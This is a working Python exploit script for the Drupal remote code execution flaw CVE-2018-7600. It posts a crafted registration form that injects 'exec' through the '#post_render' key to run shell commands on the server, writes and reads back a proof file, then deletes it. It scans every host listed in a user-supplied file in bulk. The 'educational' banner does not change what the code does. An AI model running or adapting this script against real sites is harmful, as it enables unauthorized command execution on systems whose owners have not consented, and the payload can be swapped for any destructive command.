#!/usr/bin/env python3
from random import sample
from requests import post, get
from string import ascii_lowercase
from readline import parse_and_bind

info = '\033[1;33m[!]\033[1;m '
que = '\033[1;34m[?]\033[1;m '
bad = '\033[1;31m[-]\033[1;m '
good = '\033[1;32m[+]\033[1;m '

# Config:
cleanup = True  # Automated Cleanup

# Creates random file name
file_to_create = ''.join(sample(ascii_lowercase, 5)) + ".txt"
# Bash payload for creating user file
bash_command = "echo UID: $(id -u) Name: $(id -u -n) | tee %s" % file_to_create
# Bash payload for deleting
rm_command = "rm %s" % file_to_create


def generate_payload(command):
    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': command
    }
    return payload


def cve_2018_7600(target):
    if not target.startswith('http'):
        print(bad + 'Target URL must contain http or https')

    if not target.endswith('/'):
        target = target + '/'

    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = generate_payload(bash_command)

    r = post(url, data=payload)
    if r.status_code != 200:
        print(bad + target + ' Not exploitable')
        return False
    else:
        print(good + target + ' Possibly exploitable')
        user_txt = target + file_to_create
        print(good + 'Checking... ' + user_txt)
        r_user = get(user_txt)
        if r_user.status_code != 404:
            print(good + target + ' Exploitable')
            print(good + r_user.text.strip())
            if cleanup:
                print(good + "Deleting... " + user_txt)
                payload = generate_payload(rm_command)
                post(url, data=payload)
            return True
        print(bad + target + ' Not exploitable')
        return False


def exploit_from_file(file_name):
    vulnerable_sites = []
    with open(file_name) as file:
        for target in file:
            target = target.strip()
            try:
                result = cve_2018_7600(target)
                if result:
                    vulnerable_sites.append(target)
            except Exception as e:
                print(bad + str(e))
    return vulnerable_sites


if __name__ == '__main__':
    try:
        print(info +
              'Provided only for educational or information purposes.'.upper())
        parse_and_bind('tab: complete')
        file_name = input(
            que + 'Enter file name (example: /root/file/hosts.txt): ')
        exploit_from_file = exploit_from_file(file_name)
    except KeyboardInterrupt:
        print(bad + 'Exiting...')
        exit(0)
